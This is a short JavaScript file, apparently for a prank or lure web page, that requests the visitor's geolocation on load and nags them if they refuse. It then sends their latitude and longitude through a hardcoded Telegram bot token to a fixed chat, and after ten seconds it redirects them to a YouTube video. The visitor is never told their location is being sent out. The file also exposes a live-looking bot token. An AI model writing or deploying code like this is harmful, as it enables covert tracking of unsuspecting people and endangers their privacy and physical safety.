const botToken = '5834740713:AAFbVuuVqmoGUfp_nnlfjQ3XwCc2pNCMVTI';
const chatId = '6034145888';



function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        alert('Please give loaction permission to go front')
    }
}

function showPosition(position) {
    const messageText = "Latitude: " + position.coords.latitude +
        "\nLongitude: " + position.coords.longitude;
        console.log(messageText)
        sendLoactionToTelegram(messageText)
}


function sendLoactionToTelegram(messageText) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: messageText,
        }),
    })
        .then(response => response.json())
        .then(data => {
            console.log('Message sent:', data);
        })
        .catch(error => {
            console.error('Error sending message:', error);
        });
}




getLocation()

setTimeout(()=> {
    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
}, 10000)
